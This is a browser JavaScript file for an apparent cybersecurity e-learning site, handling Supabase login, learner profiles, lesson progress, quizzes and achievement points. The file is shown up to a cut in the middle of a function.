document.addEventListener('DOMContentLoaded', async () => {
    try {
        showLoadingScreen();
        await checkAuth();
        
        if (currentUser) {
            // Initialize session tracking
            startCourseSession();
            
            // Load course data and progress
            await loadCourseData();
            await loadUserProfile();
            await loadProgress();
            
            // Initialize UI
            initializeEventListeners();
            renderSidebar();
            loadLesson(currentLessonIndex);
            
            // Initialize additional features
            initMusicPlayer();
            addMusicIndicator();
            initializeActivityTracking();
            
            hideLoadingScreen();
        } else {
            openAuthModal();
        }
    } catch (error) {
        console.error('Error initializing course:', error);
        hideLoadingScreen();
        showToast('Failed to initialize course system', 'error');
    }
});

// =====================================================
// AUTHENTICATION SYSTEM
// =====================================================
async function checkAuth() {
    try {
        const { data: { session }, error } = await supabase.auth.getSession();
        
        if (error) {
            console.error('Auth error:', error);
            currentUser = null;
            openAuthModal();
            return;
        }

        if (!session) {
            currentUser = null;
            openAuthModal();
            return;
        }

        currentUser = session.user;
        updateUIWithUser();
    } catch (error) {
        console.error('Error checking auth:', error);
        currentUser = null;
        openAuthModal();
    }
}

function updateUIWithUser() {
    if (!currentUser) return;
    
    const name = currentUser.user_metadata?.full_name || currentUser.email.split('@')[0];
    const userElements = document.querySelectorAll('[data-user-name]');
    userElements.forEach(el => el.textContent = name);
}

// =====================================================
// USER PROFILE & STATS MANAGEMENT
// =====================================================
async function loadUserProfile() {
  try {
    // 🔍 Step 1: Try to fetch existing profile
    const { data: profile, error } = await supabase
      .from('profiles')
      .select('*')
      .eq('id', currentUser.id)
      .single();

    if (error && error.code !== 'PGRST116') {
      throw error;
    }

    if (!profile) {
      // 🆕 Step 2: Create new profile if missing
      await createUserProfile();
    } else {
      // ✅ Step 3: Use existing profile
      userStats = profile;
      await updateLastActivity();
    }

  } catch (error) {
    console.error('❌ Error loading user profile:', error);
    showToast('Failed to load user profile', 'error');
  }
}
async function createUserProfile() {
    try {
        const newProfile = {
            id: currentUser.id,
            full_name: currentUser.user_metadata?.full_name || '',
            email: currentUser.email,
            level: 'Script Kiddie',
            total_points: 0,
            completed_courses: 0,
            current_streak: 0,
            total_certificates: 0,
            total_achievements: 0,
            sections_visited: 0,
            bonus_points: 0,
            in_progress_courses: 0,
            settings_changed: 0,
            midnight_sessions: 0,
            early_sessions: 0,
            weekend_sessions: 0,
            last_activity: new Date().toISOString(),
            created_at: new Date().toISOString()
        };

        const { error } = await supabase
            .from('profiles')
            .insert([newProfile]);

        if (!error) {
            userStats = newProfile;
            // Award first login achievement
            setTimeout(() => checkAndUnlockAchievement('first_login'), 1000);
        }
    } catch (error) {
        console.error('Error creating user profile:', error);
    }
}

async function updateLastActivity() {
    try {
        const now = new Date();
        
        // Update activity tracking
        courseSession.lastActivityTime = now;
        
        // Update database
        await supabase
            .from('profiles')
            .update({ 
                last_activity: now.toISOString()
            })
            .eq('id', currentUser.id);

        // Check time-based achievements
        await checkTimeBasedAchievements(now);
        
    } catch (error) {
        console.error('Error updating last activity:', error);
    }
}

// =====================================================
// COURSE SESSION MANAGEMENT
// =====================================================
function startCourseSession() {
    courseSession.startTime = new Date();
    courseSession.pageLoadTime = new Date();
    
    logUserActivity('course_session_start', {
        course_id: COURSE_DATA.id,
        course_title: COURSE_DATA.title,
        user_agent: navigator.userAgent,
        screen_resolution: `${screen.width}x${screen.height}`
    });
    
    // Check daily streak
    checkDailyStreak();
}

function initializeActivityTracking() {
    // Track page focus/blur for accurate study time
    document.addEventListener('visibilitychange', handleVisibilityChange);
    
    // Track user interactions
    ['click', 'keydown', 'scroll', 'mousemove'].forEach(event => {
        document.addEventListener(event, trackUserInteraction, { passive: true });
    });
    
    // Periodic activity updates
    setInterval(updateStudyTime, 60000); // Every minute
    
    // Save session data before page unload
    window.addEventListener('beforeunload', saveSessionData);
}

function handleVisibilityChange() {
    if (document.hidden) {
        courseSession.lastActivityTime = new Date();
    } else {
        // Page became visible again - update activity
        updateLastActivity();
    }
}

function trackUserInteraction() {
    courseSession.interactionCount++;
    courseSession.lastActivityTime = new Date();
    
    // Throttle activity updates
    if (courseSession.interactionCount % 50 === 0) {
        updateLastActivity();
    }
}

function updateStudyTime() {
    if (!courseSession.startTime || document.hidden) return;
    
    const now = new Date();
    const sessionDuration = now - courseSession.startTime;
    courseSession.totalStudyTime = Math.floor(sessionDuration / 1000 / 60); // in minutes
    
    // Update progress with study time
    saveProgress();
}

function saveSessionData() {
    if (!currentUser || !courseSession.startTime) return;
    
    const sessionData = {
        user_id: currentUser.id,
        course_id: COURSE_DATA.id,
        session_duration: courseSession.totalStudyTime,
        lessons_viewed: courseSession.lessonsStarted,
        lessons_completed: courseSession.lessonsCompleted,
        interactions: courseSession.interactionCount,
        session_date: courseSession.startTime.toISOString().split('T')[0]
    };
    
    // Store in localStorage as backup
    localStorage.setItem('course_session_backup', JSON.stringify(sessionData));
    
    // Try to save to database
    logUserActivity('course_session_end', sessionData);
}

// =====================================================
// COURSE DATA & PROGRESS MANAGEMENT
// =====================================================
async function loadCourseData() {
    try {
        // Update course info in UI
        document.getElementById('courseTitle').textContent = COURSE_DATA.title;
        document.getElementById('totalLessons').textContent = COURSE_DATA.lessons.length;
        
        // Log course access
        logUserActivity('course_access', {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title
        });
        
    } catch (error) {
        console.error('Error loading course data:', error);
    }
}

async function loadProgress() {
    try {
        // Get existing progress from database
        const { data, error } = await supabase
            .from('course_progress')
            .select('*')
            .eq('user_id', currentUser.id)
            .eq('course_id', COURSE_DATA.id)
            .single();

        if (error && error.code !== 'PGRST116') {
            throw error;
        }

        if (data) {
            courseProgress = JSON.parse(data.lesson_progress || '{}');
            currentLessonIndex = data.current_lesson || 0;
            
            // Update session tracking
            courseSession.lessonsStarted = Object.keys(courseProgress).length;
            courseSession.lessonsCompleted = Object.values(courseProgress).filter(p => p.completed).length;
        } else {
            // Initialize new progress
            courseProgress = {};
            currentLessonIndex = 0;
            await saveProgress();
            
            // Award first course start achievement
            await checkAndUnlockAchievement('first_course_start');
        }

        updateProgressDisplay();
        
    } catch (error) {
        console.error('Error loading progress:', error);
        showToast('Failed to load progress', 'error');
    }
}

async function saveProgress() {
    try {
        if (!currentUser) return;

        const now = new Date();
        const progressData = {
            user_id: currentUser.id,
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            current_lesson: currentLessonIndex,
            lesson_progress: JSON.stringify(courseProgress),
            progress: calculateOverallProgress(),
            lessons_completed: getCompletedLessonsCount(),
            lessons_started: Object.keys(courseProgress).length,
            study_time_minutes: courseSession.totalStudyTime,
            last_accessed: now.toISOString(),
            updated_at: now.toISOString()
        };

        // Upsert progress
        const { error } = await supabase
            .from('course_progress')
            .upsert([progressData]);

        if (error) throw error;

        // Update user stats
        await updateUserStats();
        
        updateProgressDisplay();

    } catch (error) {
        console.error('Error saving progress:', error);
        showToast('Failed to save progress', 'error');
    }
}

async function updateUserStats() {
    try {
        // Get all course progress for this user
        const { data: allProgress, error } = await supabase
            .from('course_progress')
            .select('progress, course_id, study_time_minutes')
            .eq('user_id', currentUser.id);

        if (error) throw error;

        // Calculate stats
        const completedCourses = allProgress?.filter(p => p.progress >= 100).length || 0;
        const inProgressCourses = allProgress?.filter(p => p.progress > 0 && p.progress < 100).length || 0;
        const totalStudyTime = allProgress?.reduce((sum, p) => sum + (p.study_time_minutes || 0), 0) || 0;

        // Calculate points (500 per completed course + achievement points)
        const coursePoints = completedCourses * 500;
        const bonusPoints = userStats.bonus_points || 0;
        const totalPoints = coursePoints + bonusPoints;

        // Update profile
        const updateData = {
            completed_courses: completedCourses,
            in_progress_courses: inProgressCourses,
            total_points: totalPoints,
            total_study_time: totalStudyTime,
            last_activity: new Date().toISOString()
        };

        const { error: updateError } = await supabase
            .from('profiles')
            .update(updateData)
            .eq('id', currentUser.id);

        if (updateError) throw updateError;

        // Update local stats
        Object.assign(userStats, updateData);

    } catch (error) {
        console.error('Error updating user stats:', error);
    }
}

function calculateOverallProgress() {
    const completedLessons = getCompletedLessonsCount();
    return Math.round((completedLessons / COURSE_DATA.lessons.length) * 100);
}

function getCompletedLessonsCount() {
    return Object.values(courseProgress).filter(lesson => lesson.completed).length;
}

function updateProgressDisplay() {
    const completedCount = getCompletedLessonsCount();
    const progressPercent = calculateOverallProgress();
    
    // Update UI elements
    const elements = {
        'completedLessons': completedCount,
        'courseProgressPercent': `${progressPercent}%`
    };
    
    Object.entries(elements).forEach(([id, value]) => {
        const element = document.getElementById(id);
        if (element) element.textContent = value;
    });
    
    // Update progress bar
    const progressBar = document.getElementById('courseProgressFill');
    if (progressBar) progressBar.style.width = `${progressPercent}%`;
}

// =====================================================
// LESSON MANAGEMENT
// =====================================================
function loadLesson(index) {
    if (index < 0 || index >= COURSE_DATA.lessons.length) return;

    const lesson = COURSE_DATA.lessons[index];
    currentLessonIndex = index;

    // Mark lesson as started and track activity
    if (!courseProgress[lesson.id]) {
        courseProgress[lesson.id] = { 
            started: true, 
            completed: false,
            startedAt: new Date().toISOString(),
            timeSpent: 0
        };
        
        courseSession.lessonsStarted++;
        saveProgress();
        
        // Log lesson start
        logUserActivity('lesson_start', {
            lesson_id: lesson.id,
            lesson_title: lesson.title,
            lesson_index: index
        });
    }

    // Update lesson start time for time tracking
    courseProgress[lesson.id].currentSessionStart = new Date();

    // Update sidebar and navigation
    renderSidebar();
    updateNavigationButtons();

    // Update header info
    updateLessonHeader(lesson, index);

    // Render lesson content
    renderLessonContent(lesson);

    // Smooth scroll and animations
    window.scrollTo({ top: 0, behavior: 'smooth' });
    document.getElementById('contentBody').scrollTop = 0;

    const contentBody = document.getElementById('contentBody');
    contentBody.classList.add('fade-in');
    setTimeout(() => contentBody.classList.remove('fade-in'), 500);
    
    // Check lesson-based achievements
    checkLessonAchievements(index + 1);
}

function updateLessonHeader(lesson, index) {
    const elements = {
        'currentLessonNumber': index + 1,
        'currentLessonTitle': lesson.title,
        'navInfo': `Lesson ${index + 1} of ${COURSE_DATA.lessons.length}`
    };
    
    Object.entries(elements).forEach(([id, value]) => {
        const element = document.getElementById(id);
        if (element) element.textContent = value;
    });
}

function renderSidebar() {
    const lessonNav = document.getElementById('lessonNav');
    if (!lessonNav) return;
    
    lessonNav.innerHTML = '';

    COURSE_DATA.lessons.forEach((lesson, index) => {
        const lessonItem = document.createElement('div');
        lessonItem.className = 'lesson-item';
        
        // Determine lesson status
        const lessonProgress = courseProgress[lesson.id];
        const isCompleted = lessonProgress?.completed || false;
        const isInProgress = lessonProgress?.started || false;
        const isLocked = !isCompleted && !canAccessLesson(index);
        const isActive = index === currentLessonIndex;

        // Apply status classes
        if (isCompleted) lessonItem.classList.add('completed');
        if (isLocked) lessonItem.classList.add('locked');
        if (isActive) lessonItem.classList.add('active');

        // Determine status display
        let statusClass = 'not-started';
        let statusIcon = index + 1;
        
        if (isCompleted) {
            statusClass = 'completed';
            statusIcon = '✓';
        } else if (isInProgress) {
            statusClass = 'in-progress';
            statusIcon = '◐';
        }

        // Create lesson item HTML
        lessonItem.innerHTML = `
            <div class="lesson-status ${statusClass}">${statusIcon}</div>
            <div class="lesson-info">
                <div class="lesson-title">${lesson.title}</div>
                <div class="lesson-meta">
                    ${isCompleted ? 'Completed' : 
                      isInProgress ? 'In Progress' : 
                      isLocked ? 'Locked' : 'Not Started'}
                </div>
            </div>
            <div class="lesson-duration">${lesson.duration}</div>
        `;

        // Add click handler if not locked
        if (!isLocked) {
            lessonItem.addEventListener('click', () => {
                if (index !== currentLessonIndex) {
                    // Track lesson time before switching
                    trackLessonTime();
                    
                    currentLessonIndex = index;
                    loadLesson(index);
                    closeSidebar();
                }
            });
        }

        lessonNav.appendChild(lessonItem);
    });
}

function canAccessLesson(index) {
    if (index === 0) return true; // First lesson always accessible
    
    // Can access if previous lesson is completed
    const previousLessonId = COURSE_DATA.lessons[index - 1].id;
    return courseProgress[previousLessonId]?.completed || false;
}

function trackLessonTime() {
    const currentLesson = COURSE_DATA.lessons[currentLessonIndex];
    const lessonProgress = courseProgress[currentLesson.id];
    
    if (lessonProgress?.currentSessionStart) {
        const sessionTime = Math.floor((new Date() - new Date(lessonProgress.currentSessionStart)) / 1000 / 60);
        lessonProgress.timeSpent = (lessonProgress.timeSpent || 0) + sessionTime;
        delete lessonProgress.currentSessionStart;
    }
}

// =====================================================
// LESSON CONTENT RENDERING
// =====================================================
function renderLessonContent(lesson) {
    const contentContainer = document.getElementById('lessonContent');
    if (!contentContainer) return;
    
    let contentHTML = `
        <div class="content-section">
            <h2>Learning Objectives</h2>
            <ul>
                ${lesson.objectives.map(obj => `<li>${obj}</li>`).join('')}
            </ul>
        </div>
        
        <div class="content-section">
            <h2>Overview</h2>
            <p>${lesson.content.overview}</p>
        </div>
    `;

    // Render content sections
    lesson.content.sections.forEach(section => {
        contentHTML += `
            <div class="content-section">
                <h2>${section.title}</h2>
                ${section.content}
                ${section.image ? `<img src="${section.image}" alt="${section.title}" class="content-image" loading="lazy">` : ''}
            </div>
        `;
    });

    // Render code examples
    if (lesson.content.codeExamples && lesson.content.codeExamples.length > 0) {
        contentHTML += `<div class="content-section"><h2>Code Examples</h2></div>`;
        
        lesson.content.codeExamples.forEach((example, index) => {
            const codeId = `code-${lesson.id}-${index}`;
            contentHTML += `
                <div class="code-section">
                    <div class="code-header">
                        <span class="code-title">${example.title}</span>
                        <button class="copy-btn" onclick="copyCode('${codeId}')">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                    <pre class="code-block"><code id="${codeId}" class="language-${example.language}">${escapeHtml(example.code)}</code></pre>
                </div>
            `;
        });
    }

    // Render quiz
    contentHTML += renderQuiz(lesson.quiz);

    contentContainer.innerHTML = contentHTML;

    // Highlight code syntax if Prism is available
    setTimeout(() => {
        if (window.Prism) {
            Prism.highlightAll();
        }
    }, 100);
}

// =====================================================
// QUIZ SYSTEM
// =====================================================
function renderQuiz(quiz) {
    const currentLessonProgress = courseProgress[COURSE_DATA.lessons[currentLessonIndex].id];
    const isCompleted = currentLessonProgress?.completed || false;
    
    let quizHTML = `
        <div class="quiz-section" id="quizSection">
            <div class="quiz-header">
                <h2 class="quiz-title">
                    <i class="fas fa-clipboard-check"></i>
                    Knowledge Check
                </h2>
                <p class="quiz-info">
                    Complete this quiz with ${quiz.passingScore}% or higher to unlock the next lesson.
                </p>
            </div>
    `;

    if (isCompleted) {
        const savedScore = currentLessonProgress.quizScore || 0;
        quizHTML += `
            <div class="quiz-results show">
                <div class="quiz-score pass">${savedScore}%</div>
                <div class="quiz-message">
                    <strong>Lesson Completed!</strong><br>
                    You've successfully passed this lesson's quiz.
                </div>
            </div>
        `;
    } else {
        // Render quiz questions
        quiz.questions.forEach((question, qIndex) => {
            quizHTML += `
                <div class="quiz-question ${qIndex === 0 ? 'active' : ''}" data-question="${qIndex}">
                    <div class="question-header">
                        <span class="question-number">Question ${qIndex + 1}</span>
                        <span class="question-progress">${qIndex + 1}/${quiz.questions.length}</span>
                    </div>
                    <div class="question-text">${question.question}</div>
                    <div class="question-options">
                        ${question.options.map((option, oIndex) => `
                            <div class="option" data-option="${oIndex}" onclick="selectOption(${qIndex}, ${oIndex})">
                                <span class="option-letter">${String.fromCharCode(65 + oIndex)}</span>
                                <span class="option-text">${option}</span>
                            </div>
                        `).join('')}
                    </div>
                </div>
            `;
        });

        quizHTML += `
            <div class="quiz-controls">
                <button class="btn btn-secondary" id="prevQuestionBtn" onclick="previousQuestion()" disabled>
                    <i class="fas fa-chevron-left"></i>
                    Previous
                </button>
                <div>
                    <button class="btn btn-secondary" id="nextQuestionBtn" onclick="nextQuestion()" disabled>
                        Next
                        <i class="fas fa-chevron-right"></i>
                    </button>
                    <button class="btn btn-primary" id="submitQuizBtn" onclick="submitQuiz()" style="display: none;">
                        <i class="fas fa-check"></i>
                        Submit Quiz
                    </button>
                </div>
            </div>

            <div class="quiz-results" id="quizResults">
                <div class="quiz-score" id="quizScore">0%</div>
                <div class="quiz-message" id="quizMessage"></div>
                <div class="quiz-actions">
                    <button class="btn btn-primary" id="continueBtn" onclick="completeLesson()" style="display: none;">
                        <i class="fas fa-arrow-right"></i>
                        Continue to Next Lesson
                    </button>
                    <button class="btn btn-secondary" onclick="retakeQuiz()">
                        <i class="fas fa-redo"></i>
                        Retake Quiz
                    </button>
                </div>
            </div>
        `;
    }

    quizHTML += '</div>';
    return quizHTML;
}

// Quiz interaction functions
function selectOption(questionIndex, optionIndex) {
    // Clear previous selections
    document.querySelectorAll(`[data-question="${questionIndex}"] .option`).forEach(opt => {
        opt.classList.remove('selected');
    });

    // Select current option
    const selectedOption = document.querySelector(`[data-question="${questionIndex}"] [data-option="${optionIndex}"]`);
    selectedOption.classList.add('selected');

    // Store answer
    quizState.answers[questionIndex] = optionIndex;

    // Update navigation
    const isLastQuestion = questionIndex === COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length - 1;
    if (isLastQuestion) {
        document.getElementById('submitQuizBtn').style.display = 'inline-flex';
        document.getElementById('nextQuestionBtn').style.display = 'none';
    } else {
        document.getElementById('nextQuestionBtn').disabled = false;
    }
}

function nextQuestion() {
    const currentQuestionEl = document.querySelector('.quiz-question.active');
    const nextQuestionEl = currentQuestionEl.nextElementSibling;
    
    if (nextQuestionEl && nextQuestionEl.classList.contains('quiz-question')) {
        currentQuestionEl.classList.remove('active');
        nextQuestionEl.classList.add('active');
        quizState.currentQuestion++;
        updateQuizNavigation();
    }
}

function previousQuestion() {
    const currentQuestionEl = document.querySelector('.quiz-question.active');
    const prevQuestionEl = currentQuestionEl.previousElementSibling;
    
    if (prevQuestionEl && prevQuestionEl.classList.contains('quiz-question')) {
        currentQuestionEl.classList.remove('active');
        prevQuestionEl.classList.add('active');
        quizState.currentQuestion--;
        updateQuizNavigation();
    }
}

function updateQuizNavigation() {
    const totalQuestions = COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length;
    const prevBtn = document.getElementById('prevQuestionBtn');
    const nextBtn = document.getElementById('nextQuestionBtn');
    const submitBtn = document.getElementById('submitQuizBtn');

    prevBtn.disabled = quizState.currentQuestion === 0;
    
    const hasAnswer = quizState.answers[quizState.currentQuestion] !== undefined;
    const isLastQuestion = quizState.currentQuestion === totalQuestions - 1;
    
    if (isLastQuestion) {
        nextBtn.style.display = 'none';
        submitBtn.style.display = hasAnswer ? 'inline-flex' : 'none';
    } else {
        nextBtn.style.display = 'inline-flex';
        nextBtn.disabled = !hasAnswer;
        submitBtn.style.display = 'none';
    }
}

async function submitQuiz() {
    const lesson = COURSE_DATA.lessons[currentLessonIndex];
    const quiz = lesson.quiz;
    let correctAnswers = 0;

    // Hide questions and controls
    document.querySelectorAll('.quiz-question').forEach(q => q.style.display = 'none');
    document.querySelector('.quiz-controls').style.display = 'none';

    // Calculate score and highlight answers
    quiz.questions.forEach((question, index) => {
        const userAnswer = quizState.answers[index];
        const correctAnswer = question.correct;
        const isCorrect = userAnswer === correctAnswer;
        
        if (isCorrect) correctAnswers++;

        // Highlight answers
        const questionEl = document.querySelector(`[data-question="${index}"]`);
        const options = questionEl.querySelectorAll('.option');
        
        options[correctAnswer].classList.add('correct');
        if (userAnswer !== correctAnswer && userAnswer !== undefined) {
            options[userAnswer].classList.add('incorrect');
        }
    });

    const score = Math.round((correctAnswers / quiz.questions.length) * 100);
    const passed = score >= quiz.passingScore;

    // Update quiz results UI
    const quizScore = document.getElementById('quizScore');
    const quizMessage = document.getElementById('quizMessage');
    const quizActions = document.querySelector('.quiz-actions');

    quizScore.textContent = `${score}%`;
    quizScore.className = `quiz-score ${passed ? 'pass' : 'fail'}`;

    if (passed) {
        quizMessage.innerHTML = `
            <strong>Congratulations!</strong><br>
            You passed with ${score}%. You can now proceed to the next lesson.
        `;
        
        quizActions.innerHTML = `
            <button class="btn btn-primary" onclick="completeLesson()">
                <i class="fas fa-arrow-right"></i>
                Continue to Next Lesson
            </button>
        `;
        
        // Mark lesson as completed
        await markLessonComplete(score);
        
    } else {
        quizMessage.innerHTML = `
            <strong>Not quite there yet.</strong><br>
            You scored ${score}%. You need ${quiz.passingScore}% to pass. Review the material and try again.
        `;
        
        quizActions.innerHTML = `
            <button class="btn btn-secondary" onclick="retakeQuiz()">
                <i class="fas fa-redo"></i>
                Retake Quiz
            </button>
        `;
    }

    document.getElementById('quizResults').classList.add('show');
    
    // Log quiz completion
    logUserActivity('quiz_completed', {
        lesson_id: lesson.id,
        lesson_title: lesson.title,
        score: score,
        passed: passed,
        attempts: (courseProgress[lesson.id]?.quizAttempts || 0) + 1
    });

    // Scroll to results
    document.getElementById('quizResults').scrollIntoView({ behavior: 'smooth' });
}

function retakeQuiz() {
    // Reset quiz state
    quizState = {
        currentQuestion: 0,
        answers: [],
        score: 0,
        isComplete: false
    };

    // Track quiz retry
    const lessonId = COURSE_DATA.lessons[currentLessonIndex].id;
    if (!courseProgress[lessonId]) courseProgress[lessonId] = {};
    courseProgress[lessonId].quizAttempts = (courseProgress[lessonId].quizAttempts || 0) + 1;

    // Reload lesson content
    loadLesson(currentLessonIndex);
    
    // Scroll to quiz
    setTimeout(() => {
        document.getElementById('quizSection').scrollIntoView({ behavior: 'smooth' });
    }, 500);
}

async function markLessonComplete(score) {
    const lesson = COURSE_DATA.lessons[currentLessonIndex];
    const lessonId = lesson.id;
    
    // Track lesson completion time
    trackLessonTime();
    
    // Update lesson progress
    courseProgress[lessonId] = {
        ...courseProgress[lessonId],
        completed: true,
        quizScore: score,
        completedAt: new Date().toISOString(),
        finalScore: score
    };

    // Update session tracking
    courseSession.lessonsCompleted++;

    // Save progress to database
    await saveProgress();
    
    // Update UI
    renderSidebar();
    updateNavigationButtons();

    // Check various achievements
    await checkLessonCompletionAchievements();
    await checkPerfectScoreAchievements(score);
    await checkStudyTimeAchievements();
    
    // Log lesson completion
    logUserActivity('lesson_completed', {
        lesson_id: lessonId,
        lesson_title: lesson.title,
        final_score: score,
        time_spent: courseProgress[lessonId].timeSpent || 0,
        lesson_number: currentLessonIndex + 1
    });
    
    showToast('Lesson completed successfully!', 'success');
}

async function completeLesson() {
    if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
        // Move to next lesson
        currentLessonIndex++;
        loadLesson(currentLessonIndex);
        
    } else {
        // Course completion
        await completeCourse();
    }
}

async function completeCourse() {
    try {
        const completionTime = courseSession.totalStudyTime;
        
        // Update course progress to 100% completed
        await supabase
            .from('course_progress')
            .update({
                progress: 100,
                completed_at: new Date().toISOString(),
                completion_time_minutes: completionTime
            })
            .eq('user_id', currentUser.id)
            .eq('course_id', COURSE_DATA.id);

        // Award course completion achievements
        await checkAndUnlockAchievement('course_completion_1');
        await checkSpeedCompletionAchievements(completionTime);
        await checkCourseStreakAchievements();
        
        // Update user stats
        await updateUserStats();
        
        // Show completion message
        showToast('Congratulations! Course completed successfully!', 'certificate');
        
        // Log course completion
        logUserActivity('course_completed', {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            completion_time_minutes: completionTime,
            total_lessons: COURSE_DATA.lessons.length,
            average_quiz_score: calculateAverageQuizScore()
        });
        
        // Redirect to dashboard after delay
        setTimeout(() => {
            window.location.href = '/dashboard.html';
        }, 3000);
        
    } catch (error) {
        console.error('Error completing course:', error);
        showToast('Error marking course as complete', 'error');
    }
}

// =====================================================
// ACHIEVEMENT INTEGRATION SYSTEM
// =====================================================
async function checkAndUnlockAchievement(achievementId, skipNotification = false) {
    try {
        // Prevent duplicate checks
        const cacheKey = `achievement_${achievementId}_${currentUser.id}`;
        if (sessionStorage.getItem(cacheKey)) return false;

        // Check if already unlocked
        const { data: existing, error } = await supabase
            .from('user_achievements')
            .select('id')
            .eq('user_id', currentUser.id)
            .eq('achievement_id', achievementId)
            .single();

        if (existing) {
            sessionStorage.setItem(cacheKey, 'true');
            return false;
        }

        // Award achievement
        const achievementData = {
            user_id: currentUser.id,
            achievement_id: achievementId,
            unlocked_at: new Date().toISOString(),
            points_awarded: getAchievementPoints(achievementId),
            context: 'course_system'
        };

        const { data, error: insertError } = await supabase
            .from('user_achievements')
            .insert([achievementData])
            .select()
            .single();

        if (insertError) {
            if (insertError.code === '23505') return false; // Already exists
            throw insertError;
        }

        // Update user points
       await supabase.rpc('increment_user_stats', {
  user_id_param: currentUser.id,
  points_to_add: achievementData.points_awarded,
  achievements_to_add: 1
});

        // Cache and queue notification
        sessionStorage.setItem(cacheKey, 'true');
        
        if (!skipNotification) {
            queueAchievementNotification({
                id: achievementId,
                name: getAchievementName(achievementId),
                description: getAchievementDescription(achievementId),
                points: achievementData.points_awarded,
                rarity: getAchievementRarity(achievementId),
                icon: getAchievementIcon(achievementId)
            });
        }

        return true;

    } catch (error) {
        console.error('Error unlocking achievement:', error);
        return false;
    }
}

// Helper functions for achievement data (replace with your actual achievement definitions)
function getAchievementPoints(id) {
    const pointsMap = {
        'first_course_start': 75,
        'first_lesson': 100,
        'course_completion_1': 500,
        'perfect_score': 250,
        'speed_demon': 750,
        'marathon_learner': 500,
        'night_owl': 200,
        'early_bird': 200,
        'weekend_warrior': 150,
        // Add more as needed
    };
    return pointsMap[id] || 100;
}

function getAchievementName(id) {
    const nameMap = {
        'first_course_start': 'Learning Initiated',
        'first_lesson': 'First Steps',
        'course_completion_1': 'Course Conqueror',
        'perfect_score': 'Perfectionist',
        'speed_demon': 'Speed Demon',
        // Add more as needed
    };
    return nameMap[id] || 'Achievement Unlocked';
}

function getAchievementDescription(id) {
    const descMap = {
        'first_course_start': 'Start your first cybersecurity course',
        'first_lesson': 'Complete your first lesson',
        'course_completion_1': 'Complete your first course',
        'perfect_score': 'Score 100% on any quiz',
        'speed_demon': 'Complete a course in under 2 hours',
        // Add more as needed
    };
    return descMap[id] || 'Achievement description';
}

function getAchievementRarity(id) {
    const rarityMap = {
        'first_course_start': 'common',
        'first_lesson': 'bronze',
        'course_completion_1': 'silver',
        'perfect_score': 'gold',
        'speed_demon': 'legendary',
        // Add more as needed
    };
    return rarityMap[id] || 'common';
}

function getAchievementIcon(id) {
    const iconMap = {
        'first_course_start': 'fas fa-play',
        'first_lesson': 'fas fa-baby',
        'course_completion_1': 'fas fa-trophy',
        'perfect_score': 'fas fa-star',
        'speed_demon': 'fas fa-rocket',
        // Add more as needed
    };
    return iconMap[id] || 'fas fa-award';
}

async function checkLessonAchievements(lessonNumber) {
    if (lessonNumber === 1) {
        await checkAndUnlockAchievement('first_lesson');
    }
    
    // Check if user has completed multiple lessons in one day
    const today = new Date().toISOString().split('T')[0];
    const todayCompletions = Object.values(courseProgress).filter(p => 
        p.completed && p.completedAt?.startsWith(today)
    ).length;
    
    if (todayCompletions >= 3) {
        await checkAndUnlockAchievement('lesson_marathon');
    }
}

async function checkLessonCompletionAchievements() {
    const completedCount = getCompletedLessonsCount();
    
    // Lesson-based achievements
    const lessonMilestones = [1, 5, 10, 25, 50, 100];
    for (const milestone of lessonMilestones) {
        if (completedCount >= milestone) {
            await checkAndUnlockAchievement(`lessons_${milestone}`);
        }
    }
    
    // Course completion achievements
    if (completedCount === COURSE_DATA.lessons.length) {
        await checkAndUnlockAchievement('course_completion_1');
        
        // Check for additional course completion achievements
        const { data: allCourses } = await supabase
            .from('course_progress')
            .select('course_id')
            .eq('user_id', currentUser.id)
            .eq('progress', 100);
        
        const totalCompleted = allCourses?.length || 0;
        
        const courseMilestones = [1, 5, 10, 25];
        for (const milestone of courseMilestones) {
            if (totalCompleted >= milestone) {
                await checkAndUnlockAchievement(`course_completion_${milestone}`);
            }
        }
    }
}

async function checkPerfectScoreAchievements(score) {
    if (score === 100) {
        await checkAndUnlockAchievement('perfect_score');
        
        // Check for consecutive perfect scores
        const recentScores = Object.values(courseProgress)
            .filter(p => p.completed && p.quizScore)
            .slice(-5) // Last 5 completed
            .map(p => p.quizScore);
        
        if (recentScores.length >= 3 && recentScores.every(s => s === 100)) {
            await checkAndUnlockAchievement('perfectionist_streak');
        }
    }
}

async function checkSpeedCompletionAchievements(completionTime) {
    // Speed demon: Complete course in under 2 hours (120 minutes)
    if (completionTime <= 120) {
        await checkAndUnlockAchievement('speed_demon');
    }
    
    // Quick learner: Complete course in under 4 hours (240 minutes)
    if (completionTime <= 240) {
        await checkAndUnlockAchievement('quick_learner');
    }
}

async function checkStudyTimeAchievements() {
    const totalTime = courseSession.totalStudyTime;
    
    // Marathon learner: Study for 8+ hours in a course session
    if (totalTime >= 480) { // 8 hours
        await checkAndUnlockAchievement('marathon_learner');
    }
    
    // Dedicated learner: Study for 4+ hours
    if (totalTime >= 240) { // 4 hours
        await checkAndUnlockAchievement('dedicated_learner');
    }
}

async function checkCourseStreakAchievements() {
    try {
        // Check for consecutive course completions
        const { data: recentCourses, error } = await supabase
            .from('course_progress')
            .select('completed_at, course_id')
            .eq('user_id', currentUser.id)
            .eq('progress', 100)
            .order('completed_at', { ascending: false })
            .limit(10);

        if (error || !recentCourses) return;

        // Check for courses completed on consecutive days
        let consecutiveDays = 1;
        for (let i = 1; i < recentCourses.length; i++) {
            const prevDate = new Date(recentCourses[i-1].completed_at).toDateString();
            const currentDate = new Date(recentCourses[i].completed_at).toDateString();
            const dayDiff = Math.abs(new Date(prevDate) - new Date(currentDate)) / (1000 * 60 * 60 * 24);
            
            if (dayDiff <= 1) {
                consecutiveDays++;
            } else {
                break;
            }
        }

        if (consecutiveDays >= 3) {
            await checkAndUnlockAchievement('learning_streak');
        }

    } catch (error) {
        console.error('Error checking course streak achievements:', error);
    }
}

// =====================================================
// TIME-BASED ACHIEVEMENTS
// =====================================================
async function checkTimeBasedAchievements(timestamp) {
    const hour = timestamp.getHours();
    const dayOfWeek = timestamp.getDay();

    // Night owl (after midnight, before 6 AM)
    if (hour >= 0 && hour < 6) {
        await incrementTimeBasedCounter('midnight_sessions', 'night_owl');
    }

